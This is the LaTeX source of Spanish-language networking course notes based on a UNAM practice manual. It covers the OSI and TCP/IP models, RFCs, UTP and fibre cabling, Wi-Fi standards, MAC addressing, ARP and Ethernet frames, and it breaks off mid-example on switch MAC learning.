% ApuntesRedes.tex — Archivo raíz
\documentclass[12pt, a4paper]{book}

% Encoding & Language
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[spanish, es-tabla]{babel}

% Emojis (requiere LuaLaTeX)
\usepackage{emoji}
\setemojifont{Segoe UI Emoji}

% Iconos extra
\usepackage{fontawesome5}

% Layout
\usepackage[top=2.5cm, bottom=2.5cm, left=3cm, right=3cm]{geometry}
\usepackage{hyperref}
\hypersetup{
    colorlinks=true,
    linkcolor=blue!70!black,
    urlcolor=blue!70!black,
    pdftitle={Apuntes de Redes de Datos},
    pdfauthor={Aldo Zepeda}
}

% Cajas visuales
\usepackage[most]{tcolorbox}
\tcbuselibrary{skins, breakable}

% Cajas personalizadas
\newtcolorbox{concepto}[1][]{
    title={\emoji{brain} Concepto},
    colback=blue!8!white, colframe=blue!50!black,
    fonttitle=\bfseries, breakable, #1
}
\newtcolorbox{ejemplo}[1][]{
    title={\emoji{package} Ejemplo real},
    colback=green!8!white, colframe=green!50!black,
    fonttitle=\bfseries, breakable, #1
}
\newtcolorbox{cuidado}[1][]{
    title={\emoji{warning} Cuidado},
    colback=orange!15!white, colframe=orange!70!black,
    fonttitle=\bfseries, breakable, #1
}
\newtcolorbox{moderno}[1][]{
    title={\emoji{rocket} Tecnología Moderna},
    colback=violet!8!white, colframe=violet!60!black,
    fonttitle=\bfseries, breakable, #1
}
\newtcolorbox{codigo}[1][]{
    title={\emoji{laptop} Configuración / Código},
    colback=gray!10!white, colframe=gray!60!black,
    fonttitle=\bfseries, breakable, #1
}

% Código fuente
\usepackage{listings}
\lstset{
    basicstyle=\ttfamily\small,
    backgroundcolor=\color{gray!10},
    frame=single,
    breaklines=true
}

% Diagramas
\usepackage{tikz}
\usetikzlibrary{shapes, arrows.meta, positioning, calc, decorations.pathreplacing}

% Matemáticas
\usepackage{amsmath}

% Colores
\usepackage{xcolor}

% Tablas
\usepackage{booktabs}
\usepackage{multirow}
\usepackage{array}

% Gráficos
\usepackage{graphicx}
\graphicspath{{assets/}}

%% ============================================================
\begin{document}

% Portada
\begin{titlepage}
    \centering
    \vspace*{2cm}
    {\Huge\bfseries \emoji{globe-showing-americas} Apuntes de Redes de Datos\par}
    \vspace{0.5cm}
    {\Large\bfseries Redes de Datos Seguras\par}
    \vspace{1cm}
    {\large Basado en MADO-31 --- UNAM Facultad de Ingeniería\par}
    \vspace{0.5cm}
    {\large Aldo Zepeda Moctezuma\par}
    \vspace{0.5cm}
    {\normalsize \today\par}
    \vspace{2cm}
    {\large\itshape ``Si no puedes explicarlo simplemente, no lo entiendes suficientemente bien.''\\[4pt]
    --- Albert Einstein\par}
\end{titlepage}

\tableofcontents
\newpage

% Capítulos
\chapter{\eh{globe-showing-americas} Introducción a las Redes de Datos}

%% ── 1.1 ¿Qué es una red? ─────────────────────────────────────────────────
\section{\eh{thinking-face} ¿Qué es una red de datos?}

\begin{concepto}
Una \textbf{red de datos} es un conjunto de dispositivos (computadoras, teléfonos,
impresoras, servidores) conectados entre sí para poder \textbf{compartir información
y recursos}.

\emoji{light-bulb} \textbf{Analogía:} Imagina que tienes amigos en diferentes casas.
Una red es como un sistema de tuberías que conecta todas las casas para que
puedan mandarse agua (datos) entre sí. Cada casa tiene su dirección (IP), y
las tuberías (cables o Wi-Fi) transportan el agua hasta la puerta correcta.
\end{concepto}

\section{\eh{books} Un poco de historia \emoji{hourglass-done}}

\begin{itemize}
    \item \textbf{1969 --- ARPANET:} La primera red de computadoras del mundo,
          financiada por el Departamento de Defensa de EE.UU. Solo 4 nodos:
          UCLA, Stanford, UCSB y University of Utah.
          \emoji{exploding-head} El primer mensaje enviado fue \textit{``lo''}
          porque el sistema crasheó antes de terminar de enviar \textit{``login''}!
    \item \textbf{1974 --- TCP/IP:} Vint Cerf y Bob Kahn publican el paper que
          define los protocolos de Internet.
    \item \textbf{1983 --- Nacimiento de Internet:} ARPANET adopta TCP/IP
          oficialmente. Se le llama el ``Big Bang'' de Internet.
    \item \textbf{1991 --- World Wide Web:} Tim Berners-Lee inventa HTTP y HTML
          en el CERN. Internet ya no es solo para militares e investigadores.
    \item \textbf{2003 --- Wi-Fi se masifica:} 802.11g llega a laptops de consumo.
    \item \textbf{2015 --- HTTP/2:} Google impulsa la segunda versión de HTTP.
    \item \textbf{2021 --- QUIC (RFC 9000):} Google revoluciona el transporte web.
          Hoy $\approx$25\% del tráfico de Internet usa QUIC.
    \item \textbf{2022 --- HTTP/3:} HTTP sobre QUIC estandarizado (RFC 9114).
\end{itemize}

%% ── 1.3 Modelo OSI ───────────────────────────────────────────────────────
\section{\eh{birthday-cake} El Modelo OSI --- Las 7 Capas}

\begin{concepto}
El \textbf{modelo OSI} (Open Systems Interconnection) es un modelo de referencia
creado por ISO en 1984. Divide la comunicación en red en \textbf{7 capas},
cada una con una responsabilidad específica y bien definida.

\emoji{light-bulb} \textbf{Analogía:} Es como enviar una carta por DHL. Tú
escribes el mensaje (capa 7), lo metes en un sobre (capa 6), le pones dirección
y número de seguimiento (capas 3--4), el empaquetador lo mete en una caja (capa 2),
el camión lo transporta por carretera (capa 1). Cada quien hace su parte
sin saber exactamente qué hacen los demás.
\end{concepto}

\begin{center}
\begin{tikzpicture}[
    layer/.style={rectangle, draw, minimum width=9cm, minimum height=0.85cm,
                  font=\bfseries\small, align=center, rounded corners=2pt},
]
\node[layer, fill=red!25]    (L7) at (0,5.1) {Capa 7 --- \emoji{desktop-computer} Aplicación (Application)};
\node[layer, fill=orange!30] (L6) at (0,4.25){Capa 6 --- \emoji{artist-palette} Presentación (Presentation)};
\node[layer, fill=yellow!35] (L5) at (0,3.4) {Capa 5 --- \emoji{handshake} Sesión (Session)};
\node[layer, fill=green!25]  (L4) at (0,2.55){Capa 4 --- \emoji{truck} Transporte (Transport)};
\node[layer, fill=cyan!25]   (L3) at (0,1.7) {Capa 3 --- \emoji{world-map} Red (Network)};
\node[layer, fill=blue!20]   (L2) at (0,0.85){Capa 2 --- \emoji{link} Enlace de Datos (Data Link)};
\node[layer, fill=purple!20] (L1) at (0,0.0) {Capa 1 --- \emoji{electric-plug} Física (Physical)};
\draw[-{Stealth}, thick] (L7.south) -- (L6.north);
\draw[-{Stealth}, thick] (L6.south) -- (L5.north);
\draw[-{Stealth}, thick] (L5.south) -- (L4.north);
\draw[-{Stealth}, thick] (L4.south) -- (L3.north);
\draw[-{Stealth}, thick] (L3.south) -- (L2.north);
\draw[-{Stealth}, thick] (L2.south) -- (L1.north);
\end{tikzpicture}
\end{center}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{clll}
\toprule
\textbf{Capa} & \textbf{Nombre} & \textbf{Qué hace} & \textbf{Ejemplos} \\
\midrule
7 & Aplicación   & Interfaz con el usuario y apps       & HTTP, DNS, SMTP, FTP \\
6 & Presentación & Codifica, comprime y cifra           & TLS, Base64, JPEG \\
5 & Sesión       & Gestiona sesiones de comunicación    & NetBIOS, RPC \\
4 & Transporte   & Entrega extremo a extremo, puertos   & TCP, UDP, QUIC \\
3 & Red          & Enrutamiento entre redes distintas   & IP, ICMP, OSPF, BGP \\
2 & Enlace       & Entrega en la misma red local (LAN)  & Ethernet, MAC, ARP \\
1 & Física       & Bits sobre el medio físico           & UTP, Fibra, Radio \\
\bottomrule
\end{tabular}
\caption{Resumen del modelo OSI}
\end{table}

\begin{cuidado}
\textbf{\emoji{brain} Mnemónica (capas 7 a 1):}

\textbf{A}ll \textbf{P}eople \textbf{S}eem \textbf{T}o \textbf{N}eed \textbf{D}ata \textbf{P}rocessing

(Application, Presentation, Session, Transport, Network, Data Link, Physical)
\end{cuidado}

%% ── 1.4 Modelo TCP/IP ─────────────────────────────────────────────────────
\section{\eh{laptop} El Modelo TCP/IP (Modelo de Internet)}

\begin{concepto}
El \textbf{modelo TCP/IP} es el que usa Internet en la realidad. Fue creado
por DARPA en los 70s y tiene \textbf{4 capas}. No es un modelo teórico sino
el protocolo real que funciona hoy en cada dispositivo conectado a Internet.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Capa TCP/IP} & \textbf{Equivale a OSI} & \textbf{Protocolos} \\
\midrule
Aplicación    & Capas 7 + 6 + 5 & HTTP, DNS, SMTP, SSH, FTP \\
Transporte    & Capa 4          & TCP, UDP, QUIC \\
Internet      & Capa 3          & IPv4, IPv6, ICMP \\
Acceso a red  & Capas 2 + 1     & Ethernet, Wi-Fi, ARP \\
\bottomrule
\end{tabular}
\caption{Modelo TCP/IP vs OSI}
\end{table}

%% ── 1.5 PDUs ──────────────────────────────────────────────────────────────
\section{\eh{package} PDUs --- ¿Cómo se llaman los datos en cada capa?}

Cada capa llama de distinta forma a la unidad de datos que maneja
(\textbf{PDU}: Protocol Data Unit):

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{clll}
\toprule
\textbf{Capa} & \textbf{PDU} & \textbf{Contiene} & \textbf{Analogía} \\
\midrule
7--5 & Datos (Data)            & El mensaje de la app    & El texto de la carta \\
4    & Segmento / Datagrama    & Datos + puertos         & Carta con remitente y destinatario \\
3    & Paquete (Packet)        & Segmento + IPs          & Caja con dirección postal \\
2    & Trama (Frame)           & Paquete + MACs          & Caja subida al camión \\
1    & Bits                    & 0s y 1s en el cable     & Las ruedas del camión girando \\
\bottomrule
\end{tabular}
\caption{PDUs por capa OSI}
\end{table}

\begin{ejemplo}
\textbf{Qué pasa cuando abres \texttt{google.com}:}
\begin{enumerate}
    \item Tu browser (capa 7) genera un \textbf{HTTP GET /}
    \item TCP (capa 4) añade puertos (src: 54321, dst: 443) \textrightarrow{} \textbf{segmento}
    \item IP (capa 3) añade tu IP y la de Google \textrightarrow{} \textbf{paquete}
    \item Ethernet (capa 2) añade MACs \textrightarrow{} \textbf{trama}
    \item Tu NIC (capa 1) convierte en \textbf{señal eléctrica} o \textbf{radio}
    \item En Google, el proceso se invierte: reconstruyen el HTTP GET desde los bits
\end{enumerate}
\end{ejemplo}

%% ── 1.6 RFC e IETF ────────────────────────────────────────────────────────
\section{\eh{scroll} RFCs --- Las reglas de Internet}

\begin{concepto}
Un \textbf{RFC} (Request for Comments) es un documento técnico que define cómo
funciona un protocolo de Internet. Son publicados por el \textbf{IETF}
(Internet Engineering Task Force) y son de acceso público y gratuito en
\texttt{https://www.rfc-editor.org}.

\emoji{light-bulb} \textbf{Analogía:} Los RFCs son como las reglas del fútbol
publicadas por la FIFA. Sin reglas comunes, un router Cisco no podría
hablar con uno Juniper, y tu celular no podría conectarse a Internet.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{RFC} & \textbf{Protocolo} & \textbf{Año} \\
\midrule
RFC 768  & UDP                           & 1980 \\
RFC 791  & IPv4                          & 1981 \\
RFC 793  & TCP                           & 1981 \\
RFC 1918 & Direcciones IP privadas       & 1996 \\
RFC 2328 & OSPF versión 2                & 1998 \\
RFC 4251 & SSH Architecture              & 2006 \\
RFC 8200 & IPv6                          & 2017 \\
RFC 8446 & TLS 1.3                       & 2018 \\
RFC 8484 & DNS over HTTPS (DoH)          & 2018 \\
RFC 9000 & \textbf{QUIC}                 & \textbf{2021} \\
RFC 9114 & \textbf{HTTP/3}               & \textbf{2022} \\
RFC 9250 & DNS over QUIC (DoQ)           & 2022 \\
\bottomrule
\end{tabular}
\caption{RFCs clave}
\end{table}

\section{\eh{office-building} Organismos de Estandarización}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Organismo} & \textbf{Nombre completo} & \textbf{Qué estandariza} \\
\midrule
IETF  & Internet Engineering Task Force          & Protocolos de Internet (RFCs) \\
IEEE  & Inst. of Electrical and Electronics Eng. & Ethernet (802.3), Wi-Fi (802.11) \\
ISO   & Intl. Organization for Standardization  & Modelo OSI, ISO 27000 (seguridad) \\
IANA  & Internet Assigned Numbers Authority      & IPs, puertos, nombres de dominio \\
ANSI  & American National Standards Institute    & Estándares industriales EE.UU. \\
TIA   & Telecommunications Industry Association  & Cableado estructurado (con EIA) \\
LACNIC & Latin America and Caribbean NIC        & Asignación de IPs en Latinoamérica \\
\bottomrule
\end{tabular}
\caption{Organismos de estandarización}
\end{table}

\chapter{\eh{electric-plug} Capa 1 --- Física (Physical Layer)}

\section{\eh{thinking-face} ¿Qué hace la capa física?}

\begin{concepto}
La \textbf{capa física} transmite \textbf{bits crudos} (ceros y unos) sobre un
medio físico: cable de cobre, fibra óptica o señales de radio. No sabe qué
significan los datos, solo se encarga de que lleguen correctamente.

\emoji{light-bulb} \textbf{Analogía:} Es como el sistema eléctrico de tu casa.
No sabe qué aparato vas a enchufar ni para qué lo usas. Solo garantiza que
la electricidad llega con la tensión correcta al tomacorriente.
\end{concepto}

\section{\eh{thread} Cable UTP --- Unshielded Twisted Pair}

\begin{concepto}
\textbf{UTP} (par trenzado no blindado) es el cable más común en redes LAN.
Tiene \textbf{4 pares de hilos de cobre}, cada par \textbf{trenzado} entre sí
dentro de una envoltura de plástico.

\emoji{light-bulb} \textbf{¿Por qué trenzado?} Al trenzar los cables se produce
cancelación de interferencias electromagnéticas (EMI) por inducción mutua.
Un par envía la señal en ambas polaridades; las interferencias externas afectan
igual a ambos hilos y al restar las señales, el ruido se cancela. Sin trenzado,
los cables actuarían como antenas captando ruido de motores, luces fluorescentes, etc.
\end{concepto}

\subsection{Categorías de cable UTP}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lllll}
\toprule
\textbf{Categoría} & \textbf{Velocidad máx.} & \textbf{Distancia} & \textbf{Frecuencia} & \textbf{Uso típico} \\
\midrule
Cat 5e  & 1 Gbps      & 100 m & 100 MHz  & Redes hogar/oficina básica \\
Cat 6   & 10 Gbps     & 55 m  & 250 MHz  & Redes corporativas \\
Cat 6a  & 10 Gbps     & 100 m & 500 MHz  & Data centers, acceso \\
Cat 7   & 10 Gbps     & 100 m & 600 MHz  & STP, blindado, industrial \\
Cat 8   & 40 Gbps     & 30 m  & 2000 MHz & Conexiones cortas en data center \\
\bottomrule
\end{tabular}
\caption{Categorías de cable UTP y sus especificaciones}
\end{table}

\begin{cuidado}
La categoría del cable determina su velocidad máxima. Si conectas Cat 5e
a un switch de 10 Gbps, el enlace negociará automáticamente a 1 Gbps.
\textbf{El eslabón más débil de la cadena limita a todos los demás.}
También importa la categoría de los jacks, patch panels y conectores: de nada
sirve Cat 6a si los jacks son Cat 5e.
\end{cuidado}

\subsection{Normas T568-A y T568-B}

\begin{concepto}
Las normas \textbf{ANSI/EIA/TIA T568-A} y \textbf{T568-B} definen el orden
exacto de los 8 hilos dentro del conector RJ-45. Son publicadas por TIA
(Telecommunications Industry Association).
\end{concepto}

\begin{center}
\begin{tikzpicture}[
    pin/.style={rectangle, draw=gray!60!white, minimum width=0.65cm, minimum height=1.4cm,
                font=\tiny\bfseries, align=center, text=textlight}
]
% T568-B
\node[font=\bfseries\small, text=textlight] at (2.6, 2.2) {T568-B (más común en México)};
\node[pin, fill=orange!60]          at (0.65,0.7) {};
\node[pin, fill=orange!90]          at (1.3, 0.7) {};
\node[pin, fill=green!50]           at (1.95,0.7) {};
\node[pin, fill=blue!50]            at (2.6, 0.7) {};
\node[pin, fill=blue!20]            at (3.25,0.7) {};
\node[pin, fill=green!80]           at (3.9, 0.7) {};
\node[pin, fill=brown!30]           at (4.55,0.7) {};
\node[pin, fill=brown!60]           at (5.2, 0.7) {};
\foreach \i/\n in {1/1,2/2,3/3,4/4,5/5,6/6,7/7,8/8}{
    \node[font=\footnotesize] at (\i*0.65-0.0, -0.1) {\n};
}
\node[font=\tiny, text=gray] at (0.65,0.0) {};
% Color labels
\node[font=\tiny, rotate=90, anchor=center] at (0.65,0.7)  {Bl-Nar};
\node[font=\tiny, rotate=90, anchor=center] at (1.3, 0.7)  {Nar};
\node[font=\tiny, rotate=90, anchor=center] at (1.95,0.7)  {Bl-Ver};
\node[font=\tiny, rotate=90, anchor=center] at (2.6, 0.7)  {Azul};
\node[font=\tiny, rotate=90, anchor=center] at (3.25,0.7)  {Bl-Az};
\node[font=\tiny, rotate=90, anchor=center] at (3.9, 0.7)  {Verde};
\node[font=\tiny, rotate=90, anchor=center] at (4.55,0.7)  {Bl-Caf};
\node[font=\tiny, rotate=90, anchor=center] at (5.2, 0.7)  {Café};
\end{tikzpicture}
\end{center}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{clll}
\toprule
\textbf{Pin} & \textbf{T568-B} & \textbf{T568-A} & \textbf{Función (10/100)} \\
\midrule
1 & Blanco-Naranja & Blanco-Verde  & TX+ (transmisión positivo) \\
2 & Naranja        & Verde         & TX- (transmisión negativo) \\
3 & Blanco-Verde   & Blanco-Naranja & RX+ (recepción positivo) \\
4 & Azul           & Azul          & (no usado en 10/100) \\
5 & Blanco-Azul    & Blanco-Azul   & (no usado en 10/100) \\
6 & Verde          & Naranja       & RX- (recepción negativo) \\
7 & Blanco-Café    & Blanco-Café   & (no usado en 10/100) \\
8 & Café           & Café          & (no usado en 10/100) \\
\bottomrule
\end{tabular}
\caption{Orden de pines T568-A vs T568-B}
\end{table}

\begin{ejemplo}
\textbf{Cable straight-through (conexión directa):}
Ambos extremos usan el mismo estándar (T568-B). Conecta dispositivos de
diferente tipo: PC \textrightarrow{} Switch, Switch \textrightarrow{} Router.

\textbf{Cable crossover (cruzado):}
Un extremo T568-A, el otro T568-B. Los pares TX y RX se invierten.
Se usa para conectar dispositivos del mismo tipo: PC \textrightarrow{} PC,
Switch \textrightarrow{} Switch.

\emoji{light-bulb} \textbf{Hoy ya casi no se usa el crossover:} los switches
y NIC modernos tienen \textbf{Auto-MDI/MDIX} --- detectan automáticamente
si deben cruzar o no.

\textbf{Gigabit Ethernet (1000BASE-T)} usa los 4 pares (8 hilos) para
transmisión simultánea en ambas direcciones (full-duplex en cada par).
\end{ejemplo}

\section{\eh{optical-disk} Fibra Óptica}

\begin{concepto}
La fibra óptica transmite \textbf{pulsos de luz} en lugar de electricidad.
Ventajas: inmune a interferencia electromagnética, sin pérdida de señal
hasta kilómetros, y velocidades de Tbps.

\emoji{light-bulb} \textbf{Analogía:} Si el cable UTP es como hablar por
teléfono de lata con hilo (señal eléctrica que se degrada con la distancia),
la fibra es como usar un láser a través de un tubo de cristal perfecto:
la luz viaja casi sin pérdidas.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Característica} & \textbf{Multimodo (MMF)} & \textbf{Monomodo (SMF)} \\
\midrule
Diámetro del núcleo & 50 o 62.5 µm    & 8--10 µm \\
Fuente de luz       & LED / VCSEL      & Láser diodo \\
Distancia máxima    & hasta 550 m      & hasta 100+ km \\
Velocidad típica    & hasta 10 Gbps    & hasta 100 Gbps+ \\
Costo               & Menor            & Mayor \\
Color del conector  & Naranja o Aqua   & Amarillo \\
Uso                 & Dentro de edificios & Entre ciudades, ISP, Data Centers \\
\bottomrule
\end{tabular}
\caption{Fibra multimodo vs monomodo}
\end{table}

\begin{lstlisting}
   Multimodo                    Monomodo
   ┌─────────────────┐          ┌─────────────────┐
   │ núcleo 50/62µm  │ ←muchos  │ núcleo 8-10µm   │ ←un solo
   │ rayos de luz →  │  modos   │ rayo de luz →   │  modo
   └─────────────────┘          └─────────────────┘
   Dispersión modal → límite    Sin dispersión → largas distancias
   de distancia
\end{lstlisting}

\section{\eh{satellite-antenna} Wi-Fi --- Estándares IEEE 802.11}

\begin{concepto}
Wi-Fi usa \textbf{ondas de radio} para transmitir datos sin cables.
Cada generación de 802.11 mejora velocidad, distancia, o eficiencia.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lllll}
\toprule
\textbf{Estándar} & \textbf{Nombre} & \textbf{Frecuencia} & \textbf{Velocidad máx.} & \textbf{Año} \\
\midrule
802.11b  & Wi-Fi 1  & 2.4 GHz           & 11 Mbps   & 1999 \\
802.11g  & Wi-Fi 3  & 2.4 GHz           & 54 Mbps   & 2003 \\
802.11n  & Wi-Fi 4  & 2.4 / 5 GHz       & 600 Mbps  & 2009 \\
802.11ac & Wi-Fi 5  & 5 GHz             & 3.5 Gbps  & 2013 \\
802.11ax & Wi-Fi 6/6E & 2.4 / 5 / 6 GHz & 9.6 Gbps  & 2019 \\
\textbf{802.11be} & \textbf{Wi-Fi 7} & \textbf{2.4/5/6 GHz} & \textbf{46 Gbps} & \textbf{2024} \\
\bottomrule
\end{tabular}
\caption{Evolución de los estándares Wi-Fi}
\end{table}

\begin{moderno}
\textbf{\emoji{rocket} Wi-Fi 7 (802.11be, 2024)} introduce:
\begin{itemize}
    \item \textbf{Multi-Link Operation (MLO):} un dispositivo puede transmitir
          en múltiples bandas \textit{simultáneamente} (ej: 5 GHz y 6 GHz al mismo
          tiempo). Reduce latencia y duplica throughput efectivo.
    \item \textbf{Canales de 320 MHz:} el doble que Wi-Fi 6E (160 MHz).
    \item \textbf{4K-QAM:} modulación más densa, más bits por símbolo.
    \item \textbf{Latencia $<$1 ms:} clave para gaming, VR/AR, y control industrial.
    \item Teórico: 46 Gbps (en práctica con clientes reales: 5--15 Gbps).
\end{itemize}
\end{moderno}

\section{\eh{toolbox} Cableado Estructurado}

\begin{concepto}
Un sistema de \textbf{cableado estructurado} es la infraestructura de cables
y componentes instalada en un edificio de forma organizada según estándares
internacionales. Está diseñado para durar 15--25 años y soportar cualquier
tecnología de red futura.

La norma principal: \textbf{ANSI/EIA/TIA-568} (EE.UU.) y su equivalente
internacional \textbf{ISO/IEC 11801}.
\end{concepto}

Los \textbf{6 subsistemas} de un sistema de cableado estructurado:

\begin{enumerate}
    \item \textbf{Cableado horizontal:} del armario de telecomunicaciones
          al área de trabajo. Máximo 90 m de cable permanente.
    \item \textbf{Área de trabajo:} jacks RJ-45 en la pared, patch cords
          del jack al dispositivo (PC, teléfono IP, etc.).
    \item \textbf{Armario de telecomunicaciones (TR):} patch panels, switches,
          organizadores de cable. Uno por piso o zona.
    \item \textbf{Cableado backbone (vertical):} une los armarios entre sí
          y con la sala de equipos. Usa fibra óptica o UTP Cat 6a+.
    \item \textbf{Sala de equipos (ER):} servidores, routers, firewalls,
          equipos de core. Generalmente en sótano o piso dedicado.
    \item \textbf{Entrada de servicios:} donde el ISP o carrier llega
          al edificio. Demarc point (punto de demarcación).
\end{enumerate}

\begin{center}
\begin{tikzpicture}[
    box/.style={rectangle, draw=gray!50!white, rounded corners, minimum width=2.8cm,
                minimum height=0.8cm, font=\small, align=center, fill=blue!30!black, text=textlight},
    arr/.style={-{Stealth}, thick, draw=gray!60!white}
]
\node[box, fill=purple!35!black] (isp)   at (0, 4)   {ISP / Carrier};
\node[box, fill=orange!35!black] (er)    at (0, 2.8)  {Sala de Equipos\\(Subsistema 5)};
\node[box, fill=yellow!25!black] (back)  at (0, 1.6)  {Backbone Vertical\\(Subsistema 4)};
\node[box, fill=green!35!black]  (tr)    at (0, 0.4)  {Armario TR\\(Subsistema 3)};
\node[box, fill=cyan!35!black]   (horiz) at (0, -0.8) {Cable Horizontal\\(Subsistema 1)};
\node[box, fill=gray!40!black]   (wa)    at (0, -2.0) {Área de Trabajo\\(Subsistema 2)};
\node[box, fill=red!35!black]    (ent)   at (3.5,2.8) {Entrada de Servicios\\(Subsistema 6)};
\draw[arr] (isp.south) -- (er.north);
\draw[arr] (er.south)  -- (back.north);
\draw[arr] (back.south)-- (tr.north);
\draw[arr] (tr.south)  -- (horiz.north);
\draw[arr] (horiz.south)-- (wa.north);
\draw[arr] (ent.west)  -- (er.east);
\end{tikzpicture}
\end{center}

\begin{cuidado}
\textbf{Límites del cableado horizontal:}
\begin{itemize}
    \item Máx. 90 m de cable permanente (de patch panel a jack de pared)
    \item Máx. 10 m de patch cords (5 m en el TR + 5 m en el área de trabajo)
    \item Canal total máx: \textbf{100 m}
\end{itemize}
Pasarte de 100 m causa errores de señal, retransmisiones y velocidad degradada.
\end{cuidado}

\chapter{\eh{link} Capa 2 --- Enlace de Datos (Data Link Layer)}

\section{\eh{thinking-face} ¿Qué hace la capa de enlace?}

\begin{concepto}
La capa de enlace mueve \textbf{tramas (frames)} entre dos dispositivos
\textit{directamente conectados} en la misma red local. Usa \textbf{direcciones
MAC} para identificar quién envía y quién recibe dentro de la LAN.

\emoji{light-bulb} \textbf{Analogía:} Si las IPs son como las direcciones
postales que funcionan en todo el mundo, las MACs son como el número de asiento
en un salón de clases: solo funcionan dentro de ese salón (red local).
Cuando el paquete sale de la red local, las MACs cambian en cada salto de router;
la IP permanece igual.
\end{concepto}

\section{\eh{id-button} Dirección MAC}

\begin{concepto}
La \textbf{dirección MAC} (Media Access Control) es un identificador de
\textbf{48 bits = 6 bytes} grabado en la tarjeta de red (NIC) de fábrica.
Teóricamente única en el mundo, aunque puede modificarse por software.
\end{concepto}

\begin{verbatim}
  MAC: 00:1A:2B:3C:4D:5E
       ├── 3 bytes ──┤├─── 3 bytes ───┤
           OUI              NIC-specific
       (fabricante)      (único del dispositivo)

  Ejemplos de OUI:
    00:00:0C → Cisco Systems
    00:50:56 → VMware
    B8:27:EB → Raspberry Pi Foundation
    3C:22:FB → Apple
\end{verbatim}

Tipos de direcciones MAC:
\begin{itemize}
    \item \textbf{Unicast:} dirección única de un solo dispositivo. Bit 0 del primer byte = 0
    \item \textbf{Multicast:} enviar a un grupo. Bit 0 del primer byte = 1
    \item \textbf{Broadcast:} \texttt{FF:FF:FF:FF:FF:FF} --- todos los dispositivos de la LAN la reciben
\end{itemize}

\section{\eh{incoming-envelope} ARP --- Address Resolution Protocol}

\begin{concepto}
\textbf{ARP} (RFC 826) traduce direcciones IP a direcciones MAC.
Es necesario porque Ethernet solo entiende MACs, pero las aplicaciones
usan IPs. Vive entre las capas 2 y 3.

\emoji{light-bulb} \textbf{Analogía:} Sabes el nombre de tu compañero (IP)
pero necesitas saber en qué asiento está (MAC). ARP es como gritar
al salón: ``\textit{¡Oye, Juan García! ¿Cuál es tu asiento?}''
y esperar que Juan levante la mano y diga el número.
\end{concepto}

Proceso ARP completo:
\begin{enumerate}
    \item PC-A (\texttt{192.168.1.10}) quiere hablar con PC-B (\texttt{192.168.1.20})
          pero no conoce su MAC.
    \item PC-A revisa su \textbf{ARP cache}: si ya lo tiene guardado, lo usa.
          Si no:
    \item PC-A envía \textbf{ARP Request} en \textbf{broadcast}
          (\texttt{FF:FF:FF:FF:FF:FF}):
          ``¿Quién tiene \texttt{192.168.1.20}? Respóndele a \texttt{00:AA:BB:11:22:33}''
    \item Todos los dispositivos de la LAN reciben el ARP Request.
          Solo PC-B (\texttt{192.168.1.20}) responde.
    \item PC-B envía \textbf{ARP Reply} en \textbf{unicast} a PC-A:
          ``Yo tengo \texttt{192.168.1.20}, mi MAC es \texttt{00:CC:DD:44:55:66}''
    \item PC-A guarda la respuesta en su \textbf{ARP table} (cache, TTL $\approx$20 min)
    \item PC-A ya puede enviar tramas directamente a la MAC de PC-B
\end{enumerate}

\begin{cuidado}
\textbf{ARP Spoofing / ARP Poisoning:} ARP no tiene autenticación. Un atacante
puede enviar ARP Replies falsos: ``\textit{La IP del router es mi MAC}'' ---
redirigiendo todo el tráfico por su máquina (ataque \textbf{Man-in-the-Middle}).

Defensa: \textbf{Dynamic ARP Inspection (DAI)} en switches Cisco --- valida
las respuestas ARP contra una tabla de DHCP snooping.
\end{cuidado}

\section{\eh{framed-picture} Trama Ethernet (Ethernet II Frame)}

\begin{verbatim}
Ethernet II Frame:
 ┌───────────┬──────────┬────────┬──────────────────┬─────┐
 │ Dst MAC   │ Src MAC  │  Type  │     Payload      │ FCS │
 │  6 bytes  │ 6 bytes  │ 2 bytes│  46 -- 1500 B    │ 4 B │
 └───────────┴──────────┴────────┴──────────────────┴─────┘

 Type field (EtherType):
   0x0800  →  IPv4
   0x0806  →  ARP
   0x86DD  →  IPv6
   0x8100  →  VLAN tagged (802.1Q)
   0x88CC  →  LLDP (Link Layer Discovery Protocol)
\end{verbatim}

El \textbf{FCS} (Frame Check Sequence) es un \textbf{CRC-32}: el emisor calcula
un hash de la trama y lo agrega al final. El receptor recalcula; si no coincide,
la trama se descarta silenciosamente (la capa superior retransmitirá).

\textbf{MTU} (Maximum Transmission Unit): el payload máximo de Ethernet es
\textbf{1500 bytes}. Paquetes más grandes se \textbf{fragmentan} en la capa 3.
Los ``Jumbo frames'' permiten hasta 9000 bytes en redes configuradas para ello
(data centers, iSCSI).

\section{\eh{satellite} Hub vs Switch vs Bridge}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{llll}
\toprule
\textbf{Característica} & \textbf{Hub} & \textbf{Bridge} & \textbf{Switch} \\
\midrule
Capa OSI        & 1 (Física)     & 2 (Enlace)     & 2 (Enlace) / 3* \\
Inteligencia    & Ninguna        & MAC table (2p) & MAC table (muchos puertos) \\
Reenvío         & Todos los puertos & Por segmento & Solo al puerto destino \\
Dominio colisión & Uno único     & Por segmento   & Por puerto (1 por puerto) \\
Dominio broadcast & Uno          & Uno            & Uno (por VLAN) \\
Estado actual   & Obsoleto       & Reemplazado    & Estándar \\
\bottomrule
\end{tabular}
\caption{Hub vs Bridge vs Switch}
\end{table}

\begin{ejemplo}
\textbf{¿Cómo aprende un switch (MAC learning)?}
\begin{enumerate}
    \item PC-A (MAC \texttt{AA:AA}) envía trama por puerto 1
    \item Switch registra en su MAC table: ``\texttt{AA:AA} → puerto 1''
    \item Destino (MAC \texttt{BB:BB}) es desconocido → \textbf{flooding}:
